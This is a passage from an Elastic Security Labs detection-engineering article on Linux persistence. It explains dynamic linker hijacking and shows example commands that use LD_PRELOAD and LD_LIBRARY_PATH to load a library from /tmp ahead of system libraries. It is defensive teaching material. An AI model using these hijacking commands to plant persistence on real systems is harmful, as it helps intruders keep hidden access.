<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Linux Detection Engineering - A Continuation on Persistence Mechanisms — Elastic Security Labs</title><meta name="description" content="This document continues the exploration of Linux detection engineering, emphasizing advancements in monitoring persistence mechanisms. By building on past practices and insights, it provides a roadmap for improving detection strategies in complex environments."/><meta property="og:title" content="Linux Detection Engineering - A Continuation on Persistence Mechanisms — Elastic Security Labs"/><meta property="og:description" content="This document continues the exploration of Linux detection engineering, emphasizing advancements in monitoring persistence mechanisms. By building on past practices and insights, it provides a roadmap for improving detection strategies in complex environments."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/continuation-on-persistence-mechanisms/continuation-on-persistence-mechanisms.jpg?22bc88632c840931a56a34a4a17f3849"/><meta property="og:image:alt" content="This document continues the exploration of Linux detection engineering, emphasizing advancements in monitoring persistence mechanisms. By building on past practices and insights, it provides a roadmap for improving detection strategies in complex environments."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Linux Detection Engineering - A Continuation on Persistence Mechanisms — Elastic Security Labs"/><meta name="twitter:description" content="This document continues the exploration of Linux detection engineering, emphasizing advancements in monitoring persistence mechanisms. By building on past practices and insights, it provides a roadmap for improving detection strategies in complex environments."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/continuation-on-persistence-mechanisms/continuation-on-persistence-mechanisms.jpg?22bc88632c840931a56a34a4a17f3849"/><meta name="twitter:image:alt" content="This document continues the exploration of Linux detection engineering, emphasizing advancements in monitoring persistence mechanisms. By building on past practices and insights, it provides a roadmap for improving detection strategies in complex environments."/><link rel="canonical" href="https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-d387086b6bb9c1ab.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/zogrVZn0K5OKWEKPLKPt5/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/zogrVZn0K5OKWEKPLKPt5/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-01-27T00:00:00.000Z">27 January 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/ruben-groenewoud">Ruben Groenewoud</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Linux Detection Engineering -&nbsp; A Continuation on Persistence&nbsp;Mechanisms</span></h1><p class="text-zinc-200 text-base md:text-xl">Enhancing Linux detection engineering with lessons learned and refined practices for persistence monitoring.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>41 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/detection-science">Detection science</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Linux Detection Engineering - A Continuation on Persistence Mechanisms" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fcontinuation-on-persistence-mechanisms%2Fcontinuation-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h2>
<p>Welcome to part three of the Linux Persistence Detection Engineering series! In this article, we continue to dig deep into the world of Linux persistence. Building on foundational concepts and techniques explored in the previous publications, this post discusses some additional, creative and/or complex persistence mechanisms.</p>
<p>If you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:</p>
<ul>
<li><a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">Linux Detection Engineering - A Primer on Persistence Mechanisms</a></li>
<li><a href="https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms">Linux Detection Engineering - A Sequel on Persistence Mechanisms</a></li>
</ul>
<p>In this publication, we’ll provide insights into:</p>
<ul>
<li>How each works (theory)</li>
<li>How to set each up (practice)</li>
<li>How to detect them (SIEM and Endpoint rules)</li>
<li>How to hunt for them (ES|QL and OSQuery reference hunts)</li>
</ul>
<p>To make the process even more engaging, we will be leveraging <a href="https://github.com/Aegrah/PANIX">PANIX</a>, a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.</p>
<p>By the end of this series, you&#x27;ll have a robust knowledge of common and rare Linux persistence techniques; and you&#x27;ll understand how to effectively engineer detections for common and advanced adversary capabilities. Are you ready to continue the journey on Linux persistence mechanisms? Let’s dive in!</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="setup-note" class="absolute -top-32"></span>Setup note</h2>
<p>To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to <a href="https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules">enable and update our pre-built detection rules</a>. If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1574006---hijack-execution-flow-dynamic-linker-hijacking" class="absolute -top-32"></span>T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking</h2>
<p>The <a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">dynamic linker</a> is a critical component of the Linux operating system responsible for loading and linking shared libraries required by dynamically linked executables. When a program is executed, the dynamic linker resolves references to shared libraries, loading them into memory and linking them to the application at runtime. This allows programs to use external libraries, such as the GNU C Library (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">glibc</code>), without including the library code within the program itself, which saves memory and simplifies updates.</p>
<p>Several key files and paths that play a crucial role in dynamic linking libraries are the following:</p>
<ul>
<li>Dynamic linker binaries (e.g. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ld-linux-x86-64.so.2</code>):<!-- -->
<ul>
<li>Typically located in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/</code>  or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/</code> for 32-bit systems.</li>
<li>Found in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib64/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib64/</code> on 64-bit systems.</li>
</ul>
</li>
<li>Symbolic links to dynamic linker binaries:<!-- -->
<ul>
<li>Typically found in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/x86_64-linux-gnu/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/x86_64-linux-gnu/</code> for 64-bit systems.</li>
<li>Typically found in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/i386-linux-gnu/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/i386-linux-gnu/</code> on 32-bit systems.</li>
</ul>
</li>
<li>Configuration files:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf</code>: Specifies additional library paths for the dynamic linker.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.cache</code>: A precompiled cache of library locations generated by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ldconfig</code> for efficient resolution.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.preload</code>: Specifies libraries to load before any other libraries.</li>
</ul>
</li>
</ul>
<p>You can observe the dynamic linker in action using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ldd</code> command, which lists the shared libraries required by an executable and their resolved paths. For example:</p>
<pre><code>&gt; ldd /bin/ls

linux-vdso.so.1 (0x00007fff87480000)
libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f235ff29000)
/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)</code></pre>
<p>This output shows the libraries needed by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ls</code> command, along with their locations and the dynamic linker binary responsible for loading them. The dynamic linker itself appears as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib64/ld-linux-x86-64.so.2</code> in this case.</p>
<p>When a dynamically linked program is executed, the process follows these steps:</p>
<ol>
<li>The dynamic linker loads the binary&#x27;s <a href="https://man7.org/linux/man-pages/man5/elf.5.html">ELF</a> (Executable and Linkable Format) header to determine the required libraries.</li>
<li>It searches for the specified libraries in paths defined by:<!-- -->
<ol>
<li>Default system library paths.</li>
<li>Custom paths specified in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf</code> or environment variables like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code>.</li>
</ol>
</li>
<li>It maps the libraries into the program’s memory space and resolves symbols (e.g., function or variable references) required by the program.</li>
<li>Execution is handed over to the program once all dependencies are resolved.</li>
</ol>
<p>Dynamic Linker Hijacking occurs when an attacker manipulates the linking process to redirect execution flow. This can involve altering the library search order through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code>, modifying configuration files like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf</code>, or tampering with cached library mappings in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.cache</code>.</p>
<p>Malware such as <a href="https://sandflysecurity.com/blog/detecting-and-de-cloaking-hiddenwasp-linux-stealth-malware/">HiddenWasp</a>, <a href="https://intezer.com/blog/research/new-linux-threat-symbiote/">Symbiote</a>, and open-source rootkits such as <a href="https://github.com/ldpreload/Medusa">Medusa</a> and <a href="https://github.com/chokepoint/azazel">Azazel</a> leverage this technique to establish persistence. MITRE ATT&amp;CK tracks this technique under the identifier <a href="https://attack.mitre.org/techniques/T1574/006/">T1574.006</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1574006---dynamic-linker-hijacking-ld_preload" class="absolute -top-32"></span>T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD</h3>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code> environment variables control how shared libraries are loaded by dynamically linked executables. Both are legitimate tools for debugging, profiling, and customizing application behavior, but they are also susceptible to abuse by attackers seeking to hijack the execution flow.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> variable allows users to specify shared libraries that the dynamic linker should load before any others. This preloading ensures that functions or symbols in the specified libraries override those in standard or program-specified libraries. For instance, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> is often used to test new implementations of library functions without modifying the application itself. For example:</p>
<pre><code>LD_PRELOAD=/tmp/custom_library.so /bin/ls</code></pre>
<p>In this case, the dynamic linker will load <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">custom_library.so</code> before loading any other libraries required by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/ls</code>, effectively replacing or augmenting its behavior. Running <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ldd</code> this time shows a different output:</p>
<pre><code>&gt; ldd /bin/ls

linux-vdso.so.1 (0x00007fff87480000)
libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f235ff29000)
libcustom.so =&gt; /tmp/custom_library.so (0x00007f23ac7e5000)
/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)</code></pre>
<p>Indicating that the potentially malicious <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">custom_library.so</code> will be loaded prior to all others.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code> variable specifies directories for the dynamic linker to search when resolving shared libraries. This variable takes precedence over default library paths like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/</code>, allowing users to override system libraries with custom versions located in alternate directories:</p>
<pre><code>LD_LIBRARY_PATH=/tmp/custom_libs /bin/ls</code></pre>
